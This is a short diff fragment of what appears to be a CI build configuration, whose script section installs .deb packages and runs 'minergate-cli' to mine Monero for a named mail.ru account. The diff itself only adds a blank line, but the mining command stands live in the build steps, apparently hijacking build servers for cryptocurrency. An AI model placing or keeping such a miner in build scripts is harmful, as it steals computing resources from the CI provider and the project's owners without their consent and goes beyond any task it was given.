@@ -10,3 +10,4 @@ script:
   - dpkg -i *.deb
   - minergate-cli -user filip.uzbekov.2017@mail.ru -xmr
 
+
